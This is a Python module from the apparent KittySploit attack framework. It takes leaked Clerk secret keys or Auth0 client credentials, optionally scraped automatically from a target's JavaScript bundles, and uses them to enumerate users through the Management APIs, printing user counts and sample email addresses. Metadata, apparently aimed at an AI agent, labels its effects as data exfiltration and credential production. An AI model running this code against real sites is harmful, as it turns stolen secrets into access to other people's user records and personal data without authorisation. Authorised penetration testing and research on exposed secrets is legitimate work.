#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enumerate Clerk and Auth0 Management APIs using leaked secret keys.

Follow-up for scanner/http/vibe_stack_secrets_detect.
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.clerk_auth0_probe import enumerate_clerk_auth0
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Clerk / Auth0 Management API Enumeration",
        "description": (
            "Uses leaked Clerk secret keys or Auth0 client credentials to enumerate "
            "users via Management APIs. Auto-discovers credentials from SPA bundles."
        ),
        "author": ["KittySploit Team"],
        "tags": ["clerk", "auth0", "oauth", "iam", "enumeration", "auxiliary", "nocode"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.2,
            "noise": 0.4,
            "value": 1.3,
        },
    }

    clerk_secret_key = OptString("", "Clerk secret key (sk_live_… / sk_test_…)", False)
    auth0_domain = OptString("", "Auth0 tenant domain (tenant.auth0.com)", False)
    auth0_client_id = OptString("", "Auth0 Management API client ID", False)
    auth0_client_secret = OptString("", "Auth0 client secret", False)
    auto_discover = OptBool(True, "Scrape target assets for Clerk/Auth0 credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_clerk_auth0(
            self.session,
            homepage,
            verify_ssl=verify,
            clerk_secret=str(self.clerk_secret_key or "").strip(),
            auth0_domain=str(self.auth0_domain or "").strip(),
            auth0_client_id=str(self.auth0_client_id or "").strip(),
            auth0_client_secret=str(self.auth0_client_secret or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Clerk/Auth0 Management API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            platform = hit.get("platform")
            if platform == "clerk":
                print_success(f"Clerk: {hit.get('users_count', 0)} user(s) — {hit.get('sample_emails', [])}")
            elif platform == "auth0":
                print_success(f"Auth0: {hit.get('users_count', 0)} user(s) — {hit.get('sample_emails', [])}")

        self.set_info(
            severity="critical",
            reason=f"Management API enum: {', '.join(sorted({str(h.get('platform')) for h in ok}))}",
            findings=findings,
            credentials={k: mask_secret(v) if "secret" in k or "token" in k or "key" in k else v for k, v in creds.items()},
        )
        return True
